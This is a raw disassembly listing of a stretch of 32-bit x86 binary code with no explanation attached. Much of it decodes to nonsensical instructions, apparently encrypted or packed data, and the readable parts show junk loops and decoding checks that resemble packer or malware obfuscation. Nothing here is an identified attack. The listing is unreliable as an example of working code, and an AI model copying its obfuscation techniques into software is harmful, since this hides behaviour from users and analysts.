  407a6f:	mov    dl,0x59
  407a71:	sub    al,0x25
  407a73:	test   DWORD PTR [eax],ebp
  407a75:	jmp    0x256d4fbb
  407a7a:	or     eax,0x899a7e9
  407a7f:	das    
  407a80:	jae    0x407a20
  407a82:	out    dx,eax
  407a83:	xor    al,0xe4
  407a85:	(bad)  
  407a86:	fidiv  WORD PTR [ebp-0x3a]
  407a89:	xchg   DWORD PTR [edx-0x47babafc],eax
  407a8f:	adc    al,0xa3
  407a91:	repz sbb BYTE PTR [eax-0x38683b47],cl
  407a98:	jp     0x407a2d
  407a9a:	pop    edx
  407a9b:	mov    gs,WORD PTR [eax]
  407a9d:	push   0x99801dcd
  407aa2:	outs   dx,DWORD PTR ds:[esi]
  407aa3:	int3   
  407aa4:	aam    0xce
  407aa6:	adc    al,0x75
  407aa8:	jecxz  0x407aec
  407aaa:	std    
  407aab:	cld    
  407aac:	add    ah,bh
  407aae:	push   cs
  407aaf:	mov    bh,0xf8
  407ab1:	cli    
  407ab2:	and    cl,BYTE PTR [edx+0x14fa5c43]
  407ab8:	cmp    eax,0xc94028f2
  407abd:	in     al,dx
  407abe:	and    DWORD PTR [ebx+0x4d2491b5],0xd8eb9a6f
  407ac8:	jmp    0x88cdd84f
  407acd:	popa   
  407ace:	ins    BYTE PTR es:[edi],dx
  407acf:	sbb    al,0x4d
  407ad1:	(bad)  
  407ad2:	xchg   edx,eax
  407ad3:	inc    ecx
  407ad4:	test   eax,0xb7838a22
  407ad9:	or     eax,DWORD PTR [eax+edx*1]
  407adc:	inc    ebx
  407add:	add    esp,ebp
  407adf:	mov    cl,BYTE PTR [edi-0x5e861c2b]
  407ae5:	dec    edx
  407ae6:	mov    bh,0xaf
  407ae8:	mov    eax,0xa18aa9fd
  407aed:	xchg   esi,eax
  407aee:	adc    dl,BYTE PTR [eax-0x713654f9]
  407af4:	loope  0x407ab8
  407af6:	test   BYTE PTR [edi-0x7],dh
  407af9:	ror    BYTE PTR [ebx+0x51],cl
  407afc:	sub    ecx,ecx
  407afe:	(bad)  
  407aff:	fdiv   DWORD PTR [edi]
  407b01:	pushf  
  407b02:	ja     0x407b1c
  407b04:	push   edi
  407b05:	stos   DWORD PTR es:[edi],eax
  407b06:	addr16 push esi
  407b08:	shr    DWORD PTR [ebp-0x3ed1790a],1
  407b0e:	fild   WORD PTR [ebx+0x76cbb132]
  407b14:	sub    eax,edi
  407b16:	pop    ds
  407b17:	shr    BYTE PTR [edi+0x76],1
  407b1a:	jp     0x407b4e
  407b1c:	sbb    eax,0x1acd5baf
  407b21:	enter  0xc1b9,0xe4
  407b25:	xor    ecx,ebp
  407b27:	jge    0x407ae8
  407b29:	jg     0x407b34
  407b2b:	xor    DWORD PTR [eax+esi*1-0x7],0x4ff44cc8
  407b33:	gs pop ecx
  407b35:	xchg   ebp,eax
  407b36:	out    dx,al
  407b37:	in     eax,dx
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4336ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	pshufw mm1,QWORD PTR [ebx+edi*2+0x2b],0xcc
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x947e7e7c
  407c57:	out    0xd6,al
  407c59:	fcom   st(0)
  407c5b:	retf   
  407c5c:	or     esi,esi
  407c5e:	fst    st(5)
  407c60:	push   ecx
  407c61:	imul   esp,DWORD PTR [ebx],0xffffff85
  407c64:	jo     0x407cd0
  407c66:	jb     0x407c48
  407c68:	dec    ebp
  407c69:	cld    
  407c6a:	add    edi,DWORD PTR [eax]
  407c6c:	and    DWORD PTR [eax],0xffffffde
  407c6f:	imul   BYTE PTR [edx+ebp*4]
  407c72:	div    edi
  407c74:	lods   al,BYTE PTR ds:[esi]
  407c75:	loopne 0x407c65
  407c77:	sub    al,0x1d
  407c79:	xchg   edx,eax
  407c7a:	and    BYTE PTR [ecx-0x53],al
  407c7d:	adc    cl,BYTE PTR [ecx+esi*2+0x41938682]
  407c84:	sub    BYTE PTR [eax-0x52],bl
  407c87:	out    0x11,eax
  407c89:	sbb    dh,al
  407c8b:	mov    dh,dl
  407c8d:	sub    eax,0xd72559c5
  407c92:	(bad)  
  407c94:	pop    edi
  407c95:	jle    0x407ca3
  407c97:	adc    esi,DWORD PTR [ebp-0x600d4c60]
  407c9d:	mov    ebx,0x78061437
  407ca2:	or     al,0x63
  407ca4:	mov    cl,0xd1
  407ca6:	call   0x8e44fd0d
  407cab:	dec    edx
  407cac:	into   
  407cad:	int    0xd0
  407caf:	mov    ds:0x1e7be24b,al
  407cb4:	enter  0x2393,0x84
  407cb8:	inc    ebp
  407cb9:	shr    DWORD PTR [ebx],cl
  407cbb:	pop    esp
  407cbc:	loope  0x407c48
  407cbe:	jmp    0x27f8:0x29b86255
  407cc5:	push   cs
  407cc6:	adc    al,0xd8
  407cc8:	jae    0x407ca7
  407cca:	clc    
  407ccb:	jbe    0x407ceb
  407ccd:	fcomip st,st(7)
  407ccf:	call   0x2f530a0f
  407cd4:	fist   DWORD PTR [ebp+edx*4-0xc]
  407cd8:	cwde   
  407cd9:	fmul   DWORD PTR [ecx+0x66ca0056]
  407cdf:	out    0x26,eax
  407ce1:	xor    dl,bh
  407ce3:	mov    eax,ds:0xcbf0b7df
  407ce8:	and    esi,ebx
  407cea:	push   ss
  407ceb:	adc    DWORD PTR [esi+0x5b],ebx
  407cee:	or     bl,dl
  407cf0:	or     esp,esi
  407cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cf3:	test   DWORD PTR [ebx],edx
  407cf5:	xchg   ebp,eax
  407cf6:	push   ebx
  407cf7:	aad    0x4f
  407cf9:	sub    ah,0x57
  407cfc:	iret   
  407cfd:	ins    DWORD PTR es:[edi],dx
  407cfe:	outs   dx,DWORD PTR ds:[esi]
  407cff:	(bad)  [eax+ebx*8]
  407d02:	or     bl,cl
  407d04:	xchg   edi,eax
  407d05:	push   eax
  407d06:	leave  
  407d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d08:	jp     0x407ca3
  407d0a:	ds pusha 
  407d0c:	xchg   ecx,eax
  407d0d:	add    eax,0x15ed185b
  407d12:	sub    eax,DWORD PTR [edi+0x6e]
  407d15:	cmp    edx,DWORD PTR [eax+0x178ef2ba]
  407d1b:	es xchg ebx,eax
  407d1d:	fldpi  
  407d1f:	or     DWORD PTR ds:0x820afea7,eax
  407d25:	mul    DWORD PTR [ebx+ebx*2-0x6f]
  407d29:	push   ebx
  407d2a:	dec    esp
  407d2b:	push   ds
  407d2c:	xor    BYTE PTR [ebx+0x2dd5857e],bh
  407d32:	pop    ecx
  407d33:	mov    ebp,ebp
  407d35:	loopne 0x407da5
  407d37:	ja     0x407cf8
  407d39:	jmp    0x407d4d
  407d3b:	jno    0x407d82
  407d3d:	sbb    eax,0xa43e5b26
  407d42:	or     BYTE PTR [ecx],bh
  407d44:	pusha  
  407d45:	loop   0x407dc1
  407d47:	icebp  
  407d48:	dec    BYTE PTR [ecx+0x56cf851b]
  407d4e:	fcom   DWORD PTR ds:0x148b827
  407d54:	add    eax,0x70d4d11
  407d59:	xor    eax,0x75152764
  407d5e:	cmp    al,dh
  407d60:	nop
  407d61:	fist   WORD PTR [ebx+0x6dd49042]
  407d67:	push   es
  407d68:	push   ebx
  407d69:	aad    0x5
  407d6b:	sbb    esp,DWORD PTR [esp+esi*4-0x2b1b6f4d]
  407d72:	inc    esi
  407d73:	int    0xe2
  407d75:	cwde   
  407d76:	stos   BYTE PTR es:[edi],al
  407d77:	cld    
  407d78:	aad    0xb8
  407d7a:	add    al,0xec
  407d7c:	sub    bh,BYTE PTR es:[edi]
  407d7f:	gs mov ecx,0xd2937bd0
  407d85:	cs inc eax
  407d87:	add    al,0x12
  407d89:	dec    eax
  407d8a:	dec    esp
  407d8b:	mov    ebx,0x35b78006
  407d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d91:	jmp    0x39bd:0xe8f0ecb0
  407d98:	pop    dx
  407d9a:	inc    edi
  407d9b:	inc    edi
  407d9c:	inc    esp
  407d9d:	(bad)  
  407d9e:	icebp  
  407d9f:	std    
  407da0:	gs or  eax,0xdc38e47f
  407da6:	rol    BYTE PTR [eax+edi*1],cl
  407da9:	mov    ds:0x74a2093f,eax
  407dae:	pop    ds
  407daf:	pop    edi
  407db0:	mov    esp,DWORD PTR [eax+0x4d]
  407db3:	fmulp  st(7),st
  407db5:	lods   eax,DWORD PTR ds:[esi]
  407db6:	outs   dx,BYTE PTR ds:[esi]
  407db7:	mov    eax,gs:0x46e6b1d7
  407dbd:	js     0x407e19
  407dbf:	xor    dh,BYTE PTR [ecx+0x2f35f8cc]
  407dc5:	or     WORD PTR es:[ebp-0x643bf66f],di
  407dcd:	repnz add eax,0xdbee4650
  407dd3:	test   al,0xd6
  407dd5:	into   
  407dd6:	test   BYTE PTR [ecx-0x2f],dl
  407dd9:	mov    ebp,0xde07aece
  407dde:	lds    edi,FWORD PTR [ecx-0x13]
  407de1:	or     ebp,edx
  407de3:	leave  
  407de4:	mov    ebp,cs
  407de6:	dec    ebx
  407de7:	(bad)  
  407de8:	rol    DWORD PTR [eax+0x39],0x4
  407dec:	xor    al,0xc2
  407dee:	mov    ebp,0x31629df5
  407df3:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407df5:	push   cs
  407df6:	pop    ss
  407df7:	fldenv [edi+edi*8-0x62]
  407dfb:	jo     0x407daa
  407dfd:	sbb    ah,BYTE PTR [ecx]
  407dff:	sbb    bl,BYTE PTR [ebx+0xd]
  407e02:	push   ss
  407e03:	jns    0x407de0
  407e05:	cmc    
  407e06:	std    
  407e07:	sub    al,0x17
  407e09:	inc    edx
  407e0a:	adc    eax,0x8722ddac
  407e0f:	pop    edx
  407e10:	cmp    ebp,0xffffffc3
  407e13:	scas   al,BYTE PTR es:[edi]
  407e14:	or     ebx,DWORD PTR [eax-0x151902cb]
  407e1a:	leave  
  407e1b:	mov    bh,0xfd
  407e1d:	loop   0x407e93
  407e1f:	or     BYTE PTR [edi],ah
  407e21:	daa    
  407e22:	jb     0x407e58
  407e24:	mov    dl,0xeb
  407e26:	cmp    al,0x1c
  407e28:	popa   
  407e29:	cwde   
  407e2a:	imul   eax,edi,0x3561c01f
  407e30:	xchg   ecx,eax
  407e31:	pusha  
  407e32:	jmp    0x93cb25e5
  407e37:	(bad)  
  407e38:	cs pusha 
  407e3a:	dec    ecx
  407e3b:	data16 xlat BYTE PTR ds:[ebx]
  407e3d:	and    eax,DWORD PTR [edi-0x505169bd]
  407e43:	pop    edi
  407e44:	push   esp
  407e45:	(bad)  
  407e46:	call   0xb7ab0f5d
  407e4b:	clc    
  407e4c:	aas    
  407e4d:	xchg   edi,eax
  407e4e:	daa    
  407e4f:	icebp  
  407e50:	sub    DWORD PTR [edi+edx*4+0x12],eax
  407e54:	ret    0x9320
  407e57:	ja     0x407ebf
  407e59:	icebp  
  407e5a:	shl    BYTE PTR [ecx],0xb5
  407e5d:	lock dec bp
  407e60:	and    al,0x89
  407e62:	adc    BYTE PTR [ebx-0xdc20bbb],cl
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x3f752a0d
  408191:	dec    edx
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	sti    
  40819b:	cmp    DWORD PTR [edx+eiz*8-0x2c],edi
  40819f:	or     bh,BYTE PTR [ebp+0x878dea8]
  4081a5:	push   esi
  4081a6:	and    al,0xc6
  4081a8:	xacquire xchg DWORD PTR [ebp-0x35053585],edx
  4081af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b0:	push   0xffffffbd
  4081b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b3:	cld    
  4081b4:	out    dx,al
  4081b5:	ficomp DWORD PTR ds:0x7d9b9cbd
  4081bb:	push   edi
  4081bc:	sbb    ah,BYTE PTR [edi]
  4081be:	push   0x32
  4081c0:	aas    
  4081c1:	push   edx
  4081c2:	leave  
  4081c3:	outs   dx,DWORD PTR ds:[esi]
  4081c4:	cmp    ebp,esi
  4081c6:	aaa    
  4081c7:	pop    ebx
  4081c8:	push   es
  4081c9:	push   edx
  4081ca:	sub    DWORD PTR [edx-0x72],edx
  4081cd:	pop    ecx
  4081ce:	add    eax,ebx
  4081d0:	sbb    al,0x8e
  4081d2:	or     al,0x6a
  4081d4:	pop    ebx
  4081d5:	call   0xeeae:0xd3b7a8e
  4081dc:	sahf   
  4081dd:	int3   
  4081de:	test   eax,0x19eefc49
  4081e3:	mov    edi,0x6a2621d7
  4081e8:	jbe    0x40816c
  4081ea:	call   0x1f1d3353
  4081ef:	fcmovbe st,st(7)
  4081f1:	loope  0x408174
  4081f3:	mov    eax,ds:0x57b26a78
  4081f8:	mov    edi,0x92f58dbd
  4081fd:	xor    al,0x8c
  4081ff:	jne    0x4081f1
  408201:	jno    0x408198
  408203:	push   edi
  408204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408205:	pop    ss
  408206:	scas   al,BYTE PTR es:[edi]
  408207:	xor    eax,0x5652afb2
  40820c:	push   esp
  40820d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40820e:	jmp    0xb8399c3c
  408213:	cmp    BYTE PTR [edx-0x22],bh
  408216:	sub    esp,DWORD PTR [edi+0x3f]
  408219:	or     eax,0x2b4df05c
  40821e:	arpl   WORD PTR [edx-0x1f8422ae],bx
  408224:	das    
  408225:	aam    0xe3
  408227:	iret   
  408228:	push   edi
  408229:	fidiv  DWORD PTR [edx]
  40822b:	shl    DWORD PTR [ebp+0x2792c46b],1
  408231:	lahf   
  408232:	pop    esi
  408233:	pop    ebx
  408234:	cmp    DWORD PTR [edx-0x75],esi
  408237:	jmp    0x4081f7
  408239:	stos   BYTE PTR es:[edi],al
  40823a:	xor    al,0xc0
  40823c:	xor    BYTE PTR [edi+ecx*1+0x32e6dbe7],ah
  408243:	daa    
  408244:	mov    edx,0x1b3389a7
  408249:	mov    BYTE PTR [edi-0x56],0x4a
  40824d:	jmp    FWORD PTR [ecx+0x27]
  408250:	pop    esp
  408251:	or     al,0xd3
  408253:	xchg   edx,eax
  408254:	xchg   esi,eax
  408255:	aad    0x53
  408257:	test   BYTE PTR [ebx-0x35300a2],ch
  40825d:	repz in eax,dx
  40825f:	retf   0xb2c9
  408262:	clc    
  408263:	push   0xffffff8f
  408265:	xor    ch,BYTE PTR [edi]
  408267:	adc    BYTE PTR [edi-0x6e],ch
  40826a:	cmp    dh,BYTE PTR [esi+ebx*1-0x2e6e3bf5]
  408271:	in     al,0x47
  408273:	dec    esi
  408274:	push   0x1d140f04
  408279:	mov    gs,WORD PTR [esi]
  40827b:	xchg   edx,eax
  40827c:	repz mov cl,0x19
  40827f:	(bad)
  408283:	iret   
  408284:	inc    ebx
  408285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408286:	loopne 0x4082e5
  408288:	sub    BYTE PTR [ebp+0x700a30b0],bh
  40828e:	or     esp,DWORD PTR [eax]
  408290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408291:	cwde   
  408292:	mov    bl,0x3f
  408294:	test   DWORD PTR [edi+0x51],ebx
  408297:	imul   edi,ebx,0xffffffd2
  40829a:	xchg   edx,eax
  40829b:	cs fdiv st,st(4)
  40829e:	add    eax,0x31f272d5
  4082a3:	push   esi
  4082a4:	mov    esi,0x7ab679f7
  4082a9:	or     DWORD PTR [ebx+0x12f6d0ff],esp
  4082af:	push   0x99e62f7a
  4082b4:	bound  esi,QWORD PTR [edx]
  4082b6:	mov    eax,0x49479e7d
  4082bb:	pop    esi
  4082bc:	jle    0x408278
  4082be:	pop    DWORD PTR [edx]
  4082c0:	cmp    BYTE PTR [ebp-0x5e],bh
  4082c3:	cdq    
  4082c4:	mov    ds:0x90e4dae8,eax
  4082c9:	sub    BYTE PTR [eax-0x43a34628],cl
  4082cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d0:	fistp  WORD PTR [ecx-0x24]
  4082d3:	rcr    DWORD PTR [edx+0x6],1
  4082d6:	pop    esp
  4082d7:	out    dx,al
  4082d8:	jle    0x4082bb
  4082da:	inc    edi
  4082db:	pop    ebp
  4082dc:	pop    es
  4082dd:	push   edx
  4082de:	push   esp
  4082df:	ja     0x408352
  4082e1:	rcl    BYTE PTR [eax],cl
  4082e3:	cs cld 
  4082e5:	call   0x902:0xe2ff19cc
  4082ec:	out    0xe,al
  4082ee:	repz sbb ebx,DWORD PTR [edi]
  4082f1:	and    al,BYTE PTR [edx+0x14bd0e5f]
  4082f7:	cs mov ch,0x6b
  4082fa:	(bad)  [ebx]
  4082fc:	popw   ss
  4082fe:	mov    esp,0xb88817c7
  408303:	pop    ebx
  408304:	inc    esp
  408305:	add    bh,BYTE PTR [ebp-0x64e77615]
  40830b:	call   0x45fc8cd2
  408310:	pop    ds
  408311:	test   eax,ebx
  408313:	sub    BYTE PTR [edi+0x33820c21],0xd5
  40831a:	(bad)  
  40831b:	sahf   
  40831c:	dec    ebx
  40831d:	mov    ebx,DWORD PTR [eax-0x4a]
  408320:	and    eax,0xbb1b636
  408325:	jbe    0x40836e
  408327:	sub    bh,BYTE PTR [ebx+esi*8]
  40832a:	and    eax,0xb6739d42
  40832f:	(bad)
  408332:	jp     0x4082e5
  408334:	mov    dl,0x8b
  408336:	pusha  
  408337:	and    eax,0xd41ca400
  40833c:	sub    cl,BYTE PTR [ebx+eiz*4-0x20]
  408340:	dec    esi
  408341:	pop    ds
  408342:	mov    WORD PTR [edx-0x1d96ec09],es
  408348:	and    cl,cl
  40834a:	(bad)  
  40834b:	aad    0xca
  40834d:	lods   eax,DWORD PTR ds:[esi]
  40834e:	out    dx,eax
  40834f:	(bad)  
  408350:	in     al,dx
  408351:	cs in  al,0x38
  408354:	pop    ds
  408355:	mov    BYTE PTR [eax],cl
  408357:	sub    al,0x70
  408359:	sahf   
  40835a:	std    
  40835b:	mov    bh,0xb6
  40835d:	stos   BYTE PTR es:[edi],al
  40835e:	jl     0x4082e9
  408360:	mov    edx,DWORD PTR [eax-0x22]
  408363:	mov    eax,ds:0x99a2ee82
  408368:	out    0x3d,eax
  40836a:	jge    0x408392
  40836c:	mov    ?,WORD PTR [esi+edi*8-0x23f4e891]
  408373:	lahf   
  408374:	sbb    cl,BYTE PTR [eax-0x6726282c]
  40837a:	mov    ecx,0x25485d7c
  40837f:	std    
  408380:	int3   
  408381:	inc    ebp
  408382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408383:	fs imul ebx,eax,0x4e2abe40
  40838a:	repz lea edi,[edx]
  40838d:	push   0x36
  40838f:	sbb    bh,BYTE PTR [edi]
  408391:	push   eax
  408392:	fsubr  DWORD PTR [ebp+0x6d0f82b9]
  408398:	fstp   DWORD PTR [ebp-0x10fadfda]
  40839e:	into   
  40839f:	mov    ds:0xe6ae9140,al
  4083a4:	cdq    
  4083a5:	xchg   ebx,eax
  4083a6:	pop    ss
  4083a7:	jmp    0xf24a7597
  4083ac:	aas    
  4083ad:	fwait
  4083ae:	aas    
  4083af:	xlat   BYTE PTR ds:[ebx]
  4083b0:	pop    edi
